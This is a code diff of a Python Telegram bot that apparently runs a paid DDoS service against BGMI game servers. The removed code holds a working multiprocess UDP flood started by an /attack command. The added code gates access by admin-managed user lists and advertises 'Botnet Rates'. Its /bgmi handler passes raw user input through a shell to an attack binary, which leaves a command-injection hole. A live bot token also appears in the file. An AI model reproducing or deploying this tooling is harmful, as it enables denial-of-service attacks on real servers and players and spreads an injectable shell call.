@@ -9,339 +9,730 @@ import sys
 import datetime
 import logging
 import socket
+import requests
 
-# 🎛️ Function to install required packages
-def install_requirements():
-    # Check if requirements.txt file exists
+
+
+
+
+# insert your Telegram bot token here
+
+bot = telebot.TeleBot('7152947678:AAFKqMJHj_lKvwAAQxqx1WvSOU1KQRAEwU0')
+
+
+
+# Admin user IDs
+
+admin_id = ["6087651372"]
+
+
+
+# File to store allowed user IDs
+
+USER_FILE = "users.txt"
+
+
+
+# File to store command logs
+
+LOG_FILE = "log.txt"
+
+
+
+
+
+# Function to read user IDs from the file
+
+def read_users():
+
     try:
-        with open('requirements.txt', 'r') as f:
-            pass
+
+        with open(USER_FILE, "r") as file:
+
+            return file.read().splitlines()
+
     except FileNotFoundError:
-        print("Error: requirements.txt file not found!")
-        return
 
-    # Install packages from requirements.txt
+        return []
+
+
+
+# Function to read free user IDs and their credits from the file
+
+def read_free_users():
+
     try:
-        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
-        print("Installing packages from requirements.txt...")
-    except subprocess.CalledProcessError as e:
-        print(f"Error: Failed to install packages from requirements.txt ({e})")
 
-    # Install pyTelegramBotAPI
-    try:
-        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyTelegramBotAPI'])
-        print("Installing pyTelegramBotAPI...")
-    except subprocess.CalledProcessError as e:
-        print(f"Error: Failed to install pyTelegramBotAPI ({e})")
+        with open(FREE_USER_FILE, "r") as file:
 
-# Call the function to install requirements
-install_requirements()
+            lines = file.read().splitlines()
 
-# 🎛️ Telegram API token (replace with your actual token)
-TOKEN = '7152947678:AAFKqMJHj_lKvwAAQxqx1WvSOU1KQRAEwU0'
-bot = telebot.TeleBot(TOKEN, threaded=False)
+            for line in lines:
 
-# 🛡️ List of authorized user IDs (replace with actual IDs)
-AUTHORIZED_USERS = [6858718276, 6087651372]
+                if line.strip():  # Check if line is not empty
 
-# 🌐 Global dictionary to keep track of user attacks
-user_attacks = {}
+                    user_info = line.split()
 
-# ⏳ Variable to track bot start time for uptime
-bot_start_time = datetime.datetime.now()
+                    if len(user_info) == 2:
 
-# 📜 Set up logging
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+                        user_id, credits = user_info
 
-# 🛠️ Function to send UDP packets
-def udp_flood(target_ip, target_port, stop_flag):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow socket address reuse
-    while not stop_flag.is_set():
-        try:
-            packet_size = random.randint(64, 1469)  # Random packet size
-            data = os.urandom(packet_size)  # Generate random data
-            for _ in range(20000):  # Maximize impact by sending multiple packets
-                sock.sendto(data, (target_ip, target_port))
-        except Exception as e:
-            logging.error(f"Error sending packets: {e}")
-            break  # Exit loop on any socket error
+                        free_user_credits[user_id] = int(credits)
 
-# 🚀 Function to start a UDP flood attack
-def start_udp_flood(user_id, target_ip, target_port):
-    stop_flag = multiprocessing.Event()
-    processes = []
+                    else:
 
-    # Allow up to 500 CPU threads for maximum performance
-    for _ in range(min(500, multiprocessing.cpu_count())):
-        process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag))
-        process.start()
-        processes.append(process)
+                        print(f"Ignoring invalid line in free user file: {line}")
 
-    # Store processes and stop flag for the user
-    user_attacks[user_id] = (processes, stop_flag)
-    bot.send_message(user_id, f"☢️Launching an attack on {target_ip}:{target_port} 💀")
+    except FileNotFoundError:
 
-# ✋ Function to stop all attacks for a specific user
-def stop_attack(user_id):
-    if user_id in user_attacks:
-        processes, stop_flag = user_attacks[user_id]
-        stop_flag.set()  # 🛑 Stop the attack
+        pass
 
-        # 🕒 Wait for all processes to finish
-        for process in processes:
-            process.join()
 
-        del user_attacks[user_id]
-        bot.send_message(user_id, "🔴 All Attack stopped.")
+
+
+
+# List to store allowed user IDs
+
+allowed_user_ids = read_users()
+
+
+
+# Function to log command to the file
+
+def log_command(user_id, target, port, time):
+
+    user_info = bot.get_chat(user_id)
+
+    if user_info.username:
+
+        username = "@" + user_info.username
+
     else:
-        bot.send_message(user_id, "❌ No active attack found >ᴗ<")
 
-# 🕰️ Function to calculate bot uptime ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷
-def get_uptime():
-    uptime = datetime.datetime.now() - bot_start_time
-    return str(uptime).split('.')[0]  # Format uptime to exclude microseconds ˏˋ°•*⁀➷ˏˋ°•*⁀➷
+        username = f"UserID: {user_id}"
 
-# 📜 Function to log commands and actions
-def log_command(user_id, command):
-    logging.info(f"User ID {user_id} executed command: {command}")
+    
 
-# 💬 Command handler for /start ☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆
-@bot.message_handler(commands=['start'])
-def start(message):
-    user_id = message.from_user.id
-    log_command(user_id, '/start')
-    if user_id not in AUTHORIZED_USERS:
-        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @all4outgaming1")
-    else:
-        welcome_message = (
-            "🎮 **Welcome to the Ultimate Attack Bot!** 🚀\n\n"
-            "Use /attack `<IP>:<port>` to start an attack, or /stop to halt your attack.\n\n"
-            "📜 **Bot Rules - Keep It Cool!** 🌟\n"
-            "1. No spamming attacks! ⛔ Rest for 5-6 matches between DDOS.\n"
-            "2. Limit your kills! 🔫 Stay under 30-40 kills to keep it fair.\n"
-            "3. Play smart! 🎮 Avoid reports and stay low-key.\n"
-            "4. No mods allowed! 🚫 Using hacked files will get you banned.\n"
-            "5. Be respectful! 🤝 Keep communication friendly and fun.\n"
-            "6. Report issues! 🛡️ Message the owner for any problems.\n"
-            "7. Always check your command before executing! ✅\n"
-            "8. Do not attack without permission! ❌⚠️\n"
-            "9. Be aware of the consequences of your actions! ⚖️\n"
-            "10. Stay within the limits and play fair! 🤗\n"
-            "💡 Follow the rules and let's enjoy gaming together! 🎉\n"
-            "📞 Contact the owner on Instagram and Telegram: @all4outgaming1\n"
-            "☠️ To see the Telegram Bot Command type: /help"
-            "👤 To find your user ID type: /id"
-        )
-        bot.send_message(message.chat.id, welcome_message)
+    with open(LOG_FILE, "a") as file:  # Open in "append" mode
 
-# 💬 Command handler for /attack ⋆.˚🦋༘⋆⋆.˚🦋༘⋆⋆.˚🦋༘⋆ 
-@bot.message_handler(commands=['attack'])
-def attack(message):
-    user_id = message.from_user.id
-    log_command(user_id, '/attack')
-    if user_id not in AUTHORIZED_USERS:
-        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @all4outgaming1")
-        return
+        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
 
-    # Parse target IP and port from the command ︵‿︵‿︵‿︵ ⋆.˚🦋༘⋆
+
+
+
+
+# Function to clear logs
+
+def clear_logs():
+
     try:
+
+        with open(LOG_FILE, "r+") as file:
+
+            if file.read() == "":
+
+                response = "Logs are already cleared. No data found"
+
+            else:
+
+                file.truncate(0)
+
+                response = "Logs cleared successfully"
+
+    except FileNotFoundError:
+
+        response = "No logs found to clear"
+
+    return response
+
+
+
+# Function to record command logs
+
+def record_command_logs(user_id, command, target=None, port=None, time=None):
+
+    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
+
+    if target:
+
+        log_entry += f" | Target: {target}"
+
+    if port:
+
+        log_entry += f" | Port: {port}"
+
+    if time:
+
+        log_entry += f" | Time: {time}"
+
+    
+
+    with open(LOG_FILE, "a") as file:
+
+        file.write(log_entry + "\n")
+
+
+
+@bot.message_handler(commands=['add'])
+
+def add_user(message):
+
+    user_id = str(message.chat.id)
+
+    if user_id in admin_id:
+
         command = message.text.split()
-        target = command[1].split(':')
-        target_ip = target[0]
-        target_port = int(target[1])
-        start_udp_flood(user_id, target_ip, target_port)
-    except (IndexError, ValueError):
-        bot.send_message(message.chat.id, "❌ Invalid format! Use /attack `<IP>:<port>`.")
+
+        if len(command) > 1:
+
+            user_to_add = command[1]
+
+            if user_to_add not in allowed_user_ids:
+
+                allowed_user_ids.append(user_to_add)
+
+                with open(USER_FILE, "a") as file:
+
+                    file.write(f"{user_to_add}\n")
+
+                response = f"User {user_to_add} Got Access successfully"
+
+            else:
+
+                response = "User already exist in the Bot"
+
+        else:
+
+            response = "Please Specify a User ID to Add."
+
+    else:
+
+        response = "Only Admin Can Run This Command."
+
+
+
+    bot.reply_to(message, response)
+
+
+
+
+
+
+
+@bot.message_handler(commands=['remove'])
+
+def remove_user(message):
+
+    user_id = str(message.chat.id)
+
+    if user_id in admin_id:
+
+        command = message.text.split()
+
+        if len(command) > 1:
+
+            user_to_remove = command[1]
+
+            if user_to_remove in allowed_user_ids:
+
+                allowed_user_ids.remove(user_to_remove)
+
+                with open(USER_FILE, "w") as file:
+
+                    for user_id in allowed_user_ids:
+
+                        file.write(f"{user_id}\n")
+
+                response = f"User {user_to_remove} Removed Successfully ."
+
+            else:
+
+                response = f"User {user_to_remove} not found in the list."
+
+        else:
+
+            response = '''Please Specify A User ID to Remove. 
+
+Usage: /remove <userid>'''
+
+    else:
+
+        response = "Only Admin Can Run This Command."
+
+
+
+    bot.reply_to(message, response)
+
+
+
+
+
+@bot.message_handler(commands=['clearlogs'])
+
+def clear_logs_command(message):
+
+    user_id = str(message.chat.id)
+
+    if user_id in admin_id:
+
+        try:
+
+            with open(LOG_FILE, "r+") as file:
+
+                log_content = file.read()
+
+                if log_content.strip() == "":
+
+                    response = "Logs are already cleared. No data found."
+
+                else:
+
+                    file.truncate(0)
+
+                    response = "Logs Cleared Successfully"
+
+        except FileNotFoundError:
+
+            response = "Logs are already cleared."
+
+    else:
+
+        response = "Only Admin Can Run This Command."
+
+    bot.reply_to(message, response)
+
+
+
+ 
+
+
+
+@bot.message_handler(commands=['allusers'])
+
+def show_all_users(message):
+
+    user_id = str(message.chat.id)
+
+    if user_id in admin_id:
+
+        try:
+
+            with open(USER_FILE, "r") as file:
+
+                user_ids = file.read().splitlines()
+
+                if user_ids:
+
+                    response = "Authorized Users:\n"
+
+                    for user_id in user_ids:
+
+                        try:
+
+                            user_info = bot.get_chat(int(user_id))
+
+                            username = user_info.username
+
+                            response += f"- @{username} (ID: {user_id})\n"
+
+                        except Exception as e:
+
+                            response += f"- User ID: {user_id}\n"
+
+                else:
+
+                    response = "No data found"
+
+        except FileNotFoundError:
+
+            response = "No data found"
+
+    else:
+
+        response = "Only Admin Can Run This Command."
+
+    bot.reply_to(message, response)
+
+
+
+
+
+@bot.message_handler(commands=['logs'])
+
+def show_recent_logs(message):
+
+    user_id = str(message.chat.id)
+
+    if user_id in admin_id:
+
+        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
+
+            try:
+
+                with open(LOG_FILE, "rb") as file:
+
+                    bot.send_document(message.chat.id, file)
+
+            except FileNotFoundError:
+
+                response = "No data found."
+
+                bot.reply_to(message, response)
+
+        else:
+
+            response = "No data found"
+
+            bot.reply_to(message, response)
+
+    else:
+
+        response = "Only Admin Can Run This Command."
+
+        bot.reply_to(message, response)
+
+
+
+
+
+@bot.message_handler(commands=['id'])
+
+def show_user_id(message):
+
+    user_id = str(message.chat.id)
+
+    response = f"Your ID: {user_id}"
+
+    bot.reply_to(message, response)
+
+
+
+# Function to handle the reply when free users run the /bgmi command
+
+def start_attack_reply(message, target, port, time):
+
+    user_info = message.from_user
+
+    username = user_info.username if user_info.username else user_info.first_name
+
+    
+
+    response = f"{username}, Attack Started.\n\nTarget: {target}\nPort: {port}\nTime: {time} Seconds\nGame: BGMI"
+
+    bot.reply_to(message, response)
+
+
+
+# Dictionary to store the last time each user ran the /bgmi command
+
+bgmi_cooldown = {}
+
+
+
+COOLDOWN_TIME =0
+
+
+
+# Handler for /bgmi command
+
+@bot.message_handler(commands=['bgmi'])
+
+def handle_bgmi(message):
+
+    user_id = str(message.chat.id)
+
+    if user_id in allowed_user_ids:
+
+        # Check if the user is in admin_id (admins have no cooldown)
+
+        if user_id not in admin_id:
+
+            # Check if the user has run the command before and is still within the cooldown period
+
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
+
+                response = "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again."
+
+                bot.reply_to(message, response)
+
+                return
+
+            # Update the last time the user ran the command
+
+            bgmi_cooldown[user_id] = datetime.datetime.now()
+
         
-"""""
-    Me             scammer 🏳️‍🌈
- ⣠⣶⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡆⠀⠀⠀⠀
-⠀⠹⢿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡏⢀⣀⡀⠀⠀⠀⠀⠀
-⠀⠀⣠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣟⣋⣼⣽⣾⣽⣦⡀⠀⠀⠀
-⢀⣼⣿⣷⣾⡽⡄⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⣿⣿⣿⡿⢿⣟⣽⣾⣿⣿⣦⠀⠀
-⣸⣿⣿⣾⣿⣿⣮⣤⣤⣤⣤⡀⠀⠀⠻⣿⡯⠽⠿⠛⠛⠉⠉⢿⣿⣿⣿⣿⣷⡀
-⣿⣿⢻⣿⣿⣿⣛⡿⠿⠟⠛⠁⣀⣠⣤⣤⣶⣶⣶⣶⣷⣶⠀⠀⠻⣿⣿⣿⣿⣇
-⢻⣿⡆⢿⣿⣿⣿⣿⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠀⣠⣶⣿⣿⣿⣿⡟
-⠈⠛⠃⠈⢿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⠟⠋⠁⠀
-⠀⠀⠀⠀⠀⠙⢿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠟⠁⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+        command = message.text.split()
+
+        if len(command) == 4:  # Updated to accept target, time, and port
+
+            target = command[1]
+
+            port = int(command[2])  # Convert time to integer
+
+            time = int(command[3])  # Convert port to integer
+
+            if time > 300:
+
+                response = "Error: Time interval must be less than 300."
+
+            else:
+
+                record_command_logs(user_id, '/bgmi', target, port, time)
+
+                log_command(user_id, target, port, time)
+
+                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
+
+                full_command = f"./bgmi {target} {port} {time} 300"
+
+                subprocess.run(full_command, shell=True)
+
+                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
+
+        else:
+
+            response = "Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+
+    else:
+
+        response = "You Are Not Authorized To Use This Command."
 
 
-‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿ ︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵
-"""""
-# 💬 Command handler for /stop
-@bot.message_handler(commands=['stop'])
-def stop(message):
-    user_id = message.from_user.id
-    log_command(user_id, '/stop')
-    if user_id not in AUTHORIZED_USERS:
-        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @all4outgaming1")
-        return
 
-    stop_attack(user_id)
+    bot.reply_to(message, response)
 
-# 💬 Command handler for /id  
-@bot.message_handler(commands=['id'])  # 👀 Handling the /id command ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
-def show_id(message):
-    user_id = message.from_user.id  # 🔍 Getting the user ID ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
-    username = message.from_user.username  # 👥 Getting the user's username ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
-    log_command(user_id, '/id')  # 👀 Logging the command ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆ ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆
 
-    # 👤 Sending the message with the user ID and username
-    bot.send_message(message.chat.id, f"👤 Your User ID is: {user_id}\n"
-                                      f"👥 Your Username is: @{username}")
 
-    # 👑 Printing the bot owner's username ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆
-    bot_owner = "all4outgaming1"  # 👑 The bot owner's username  ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆
-    bot.send_message(message.chat.id, f"🤖 This bot is owned by: @{bot_owner}")
 
-# 💬 Command handler for /rules. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
-@bot.message_handler(commands=['rules'])
-def rules(message):
-    log_command(message.from_user.id, '/rules')
-    rules_message = (
-        "📜 **Bot Rules - Keep It Cool!** 🌟\n"
-        "1. No spamming attacks! ⛔ Rest for 5-6 matches between DDOS.\n"
-        "2. Limit your kills! 🔫 Stay under 30-40 kills to keep it fair.\n"
-        "3. Play smart! 🎮 Avoid reports and stay low-key.\n"
-        "4. No mods allowed! 🚫 Using hacked files will get you banned.\n"
-        "5. Be respectful! 🤝 Keep communication friendly and fun.\n"
-        "6. Report issues! 🛡️ Message the owner for any problems.\n"
-        "7. Always check your command before executing! ✅\n"
-        "8. Do not attack without permission! ❌⚠️\n"
-        "9. Be aware of the consequences of your actions! ⚖️\n"
-        "10. Stay within the limits and play fair! 🤗"
-    )
-    bot.send_message(message.chat.id, rules_message)
 
-# 💬 Command handler for /owner. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
-@bot.message_handler(commands=['owner'])
-def owner(message):
-    log_command(message.from_user.id, '/owner')
-    bot.send_message(message.chat.id, "📞 Contact the owner: @all4outgaming1")
 
-# 💬 Command handler for /uptime. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
-@bot.message_handler(commands=['uptime'])
-def uptime(message):
-    log_command(message.from_user.id, '/uptime')
-    bot.send_message(message.chat.id, f"⏱️ Bot Uptime: {get_uptime()}")
 
-# 💬 Command handler for /ping. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
-@bot.message_handler(commands=['ping'])
-@bot.message_handler(commands=['ping'])
-def ping_command(message):
-    user_id = message.from_user.id
-    log_command(user_id, '/ping')
+# Add /mylogs command to display logs recorded for bgmi and website commands
 
-    bot.send_message(message.chat.id, "Checking your connection speed...")
+@bot.message_handler(commands=['mylogs'])
 
-    # Measure ping time     . ݁₊ ⊹ . ݁˖ . ݁        . ݁₊ ⊹ . ݁˖ . ݁         . ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
-    start_time = time.time()
-    try:
-        # Use a simple DNS resolution to check responsiveness     ✦•┈๑⋅⋯ ⋯⋅๑┈•✦. ݁₊ ⊹ . ݁˖ . ݁
-        socket.gethostbyname('google.com')
-        ping_time = (time.time() - start_time) * 1000  # Convert to milliseconds     ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
-        ping_response = (
-            f"Ping: `{ping_time:.2f} ms` ⏱️\n"
-            f"Your IP: `{get_user_ip(user_id)}` 📍\n"
-            f"Your Username: `{message.from_user.username}` 👤\n"
-        )
-        bot.send_message(message.chat.id, ping_response)
-    except socket.gaierror:
-        bot.send_message(message.chat.id, "❌ Failed to ping! Check your connection.")
+def show_command_logs(message):
 
-def get_user_ip(user_id):
-    try:
-        ip_address = requests.get('https://api.ipify.org/').text
-        return ip_address
-    except:
-        return "IP Not Found 🤔"
+    user_id = str(message.chat.id)
 
-# 💬 Command handler for /help           ✦•┈๑⋅⋯ ⋯⋅๑┈•✦           ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
+    if user_id in allowed_user_ids:
+
+        try:
+
+            with open(LOG_FILE, "r") as file:
+
+                command_logs = file.readlines()
+
+                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
+
+                if user_logs:
+
+                    response = "Your Command Logs:\n" + "".join(user_logs)
+
+                else:
+
+                    response = "No Command Logs Found For You."
+
+        except FileNotFoundError:
+
+            response = "No command logs found."
+
+    else:
+
+        response = "You Are Not Authorized To Use This Command."
+
+
+
+    bot.reply_to(message, response)
+
+
+
+
+
 @bot.message_handler(commands=['help'])
-def help_command(message):
-    log_command(message.from_user.id, '/help')
-    help_message = (
-        "🤔 **Need Help?** 🤔\n"
-        "Here are the available commands:\n"
-        "🔹 **/start** - Start the bot 🔋\n"
-        "💣 **/attack `<IP>:<port>`** - Launch a powerful attack 💥\n"
-        "🛑 **/stop** - Stop the attack 🛑️\n"
-        "👀 **/id** - Show your user ID 👤\n"
-        "📚 **/rules** - View the bot rules 📖\n"
-        "👑 **/owner** - Contact the owner 👑\n"
-        "⏰ **/uptime** - Get bot uptime ⏱️\n"
-        "📊 **/ping** - Check your connection ping 📈\n"
-        "🤝 **/help** - Show this help message 🤝"
-    )
-    bot.send_message(message.chat.id, help_message)
 
-#### DISCLAIMER ####              ✦•┈๑⋅⋯ ⋯⋅๑┈•✦                      ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
-"""
-**🚨 IMPORTANT: PLEASE READ CAREFULLY BEFORE USING THIS BOT 🚨**
+def show_help(message):
 
-This bot is owned and operated by @all4outgaming1 on Telegram and all4outgaming on Instagram, 🇮🇳. By using this bot, you acknowledge that you understand and agree to the following terms:
+    help_text ='''Available commands:
 
-* **🔒 NO WARRANTIES**: This bot is provided "as is" and "as available", without warranty of any kind, express or implied, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement.
-* **🚫 LIMITATION OF LIABILITY**: The owner and operator of this bot, @all4outgaming1 on Telegram and all4outgaming on Instagram, shall not be liable for any damages or losses arising from the use of this bot, including but not limited to direct, indirect, incidental, punitive, and consequential damages, including loss of profits, data, or business interruption.
-* **📚 COMPLIANCE WITH LAWS**: You are responsible for ensuring that your use of this bot complies with all applicable laws and regulations, including but not limited to laws related to intellectual property, data privacy, and cybersecurity.
-* **📊 DATA COLLECTION**: This bot may collect and use data and information about your usage, including but not limited to your IP address, device information, and usage patterns, and you consent to such collection and use.
-* **🤝 INDEMNIFICATION**: You agree to indemnify and hold harmless @all4outgaming1 on Telegram and all4outgaming on Instagram, and its affiliates, officers, agents, and employees, from and against any and all claims, damages, obligations, losses, liabilities, costs or debt, and expenses (including but not limited to attorney's fees) arising from or related to your use of this bot.
-* **🌐 THIRD-PARTY LINKS**: This bot may contain links to third-party websites or services, and you acknowledge that @all4outgaming1 on Telegram and all4outgaming on Instagram is not responsible for the content, accuracy, or opinions expressed on such websites or services.
-* **🔄 MODIFICATION AND DISCONTINUATION**: You agree that @all4outgaming1 on Telegram and all4outgaming on Instagram may modify or discontinue this bot at any time, without notice, and that you will not be entitled to any compensation or reimbursement for any losses or damages arising from such modification or discontinuation.
-* **👧 AGE RESTRICTION**: You acknowledge that this bot is not intended for use by minors, and that you are at least 18 years old (or the age of majority in your jurisdiction) to use this bot.
-* **🇮🇳 GOVERNING LAW**: You agree that this disclaimer and the terms and conditions of this bot will be governed by and construed in accordance with the laws of India, 🇮🇳, and that any disputes arising from or related to this bot will be resolved through binding arbitration in accordance with the rules of [Arbitration Association].
-* **📝 ENTIRE AGREEMENT**: This disclaimer constitutes the entire agreement between you and @all4outgaming1 on Telegram and all4outgaming on Instagram regarding your use of this bot, and supersedes all prior or contemporaneous agreements or understandings.
-* **👍 ACKNOWLEDGMENT**: By using this bot, you acknowledge that you have read, understood, and agree to be bound by these terms and conditions. If you do not agree to these terms and conditions, please do not use this bot.
+/bgmi : Method For Bgmi Servers. 
 
-**👋 THANK YOU FOR READING! 👋**
-"""
-# don't Change the " DISCLAIMER " ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──
-"""
-███████▀▀▀░░░░░░░▀▀▀███████  
-████▀░░░░░░░░░░░░░░░░░▀████  
-███│░░░░░░░░░░░░░░░░░░░│███  
-██▌│░░░░░░░░░░░░░░░░░░░│▐██  
-██░└┐░░░░░░░░░░░░░░░░░┌┘░██  
-██░░└┐░░░░░░░░░░░░░░░┌┘░░██  
-██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██  
-██▌░│██████▌░░░▐██████│░▐██  
-███░│▐███▀▀░░▄░░▀▀███▌│░███  
-██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██  
-██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██  
-████▄─┘██▌░░░░░░░▐██└─▄████  
-█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████  
-████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████  
-█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████  
-███████▄░░░░░░░░░░░▄███████  
-██████████▄▄▄▄▄▄▄██████████  
-███████████████████████████  
-"""
-# 🎮 Run the bot ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──✦•┈๑⋅⋯ ⋯⋅๑┈•✦
-if __name__ == "__main__":
-    print(" 🎉🔥 Starting the Telegram bot...")  # Print statement for bot starting
-    print(" ⏱️ Initializing bot components...")  # Print statement for initialization
+/rules : Please Check Before Use !!.
 
-    # Add a delay to allow the bot to initialize ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──✦•┈๑⋅⋯ ⋯⋅๑┈•✦
-    time.sleep(5)
+/mylogs : To Check Your Recents Attacks.
 
-    # Print a success message if the bot starts successfully ╰┈➤. ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──
-    print(" 🚀 Telegram bot started successfully!")  # ╰┈➤. Print statement for successful startup
-    print(" 👍 Bot is now online and ready to Ddos_attack! ▰▱▰▱▰▱▰▱▰▱▰▱▰▱")
+/plan : Checkout Our Botnet Rates.
 
-    try:
-        bot.polling(none_stop=True)
-    except Exception as e:
-        logging.error(f"Bot encountered an error: {e}")
-        print(" 🚨 Error: Bot encountered an error. Restarting in 5 seconds... ⏰")
-        time.sleep(5)  # Wait before restarting ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
-        print(" 🔁 Restarting the Telegram bot... 🔄")
-        print(" 💻 Bot is now restarting. Please wait... ⏳")
-        
+
+
+To See Admin Commands:
+
+/admincmd : Shows All Admin Commands.
+
+
+
+Buy From :- @ReporterAlpha
+
+'''
+
+    for handler in bot.message_handlers:
+
+        if hasattr(handler, 'commands'):
+
+            if message.text.startswith('/help'):
+
+                help_text += f"{handler.commands[0]}: {handler.doc}\n"
+
+            elif handler.doc and 'admin' in handler.doc.lower():
+
+                continue
+
+            else:
+
+                help_text += f"{handler.commands[0]}: {handler.doc}\n"
+
+    bot.reply_to(message, help_text)
+
+
+
+@bot.message_handler(commands=['start'])
+
+def welcome_start(message):
+
+    user_name = message.from_user.first_name
+
+    response = f'''👋🏻Welcome, {user_name}!
+
+Try To Run This Command : /help 
+
+Join :- t.me/ChannelLink'''
+
+    bot.reply_to(message, response)
+
+
+
+@bot.message_handler(commands=['rules'])
+
+def welcome_rules(message):
+
+    user_name = message.from_user.first_name
+
+    response = f'''{user_name} Please Follow These Rules:
+
+There are no rules in our Bot.'''
+
+    bot.reply_to(message, response)
+
+
+
+@bot.message_handler(commands=['plan'])
+
+def welcome_plan(message):
+
+    user_name = message.from_user.first_name
+
+    response = f'''{user_name}, we only have powerful plan!!:
+
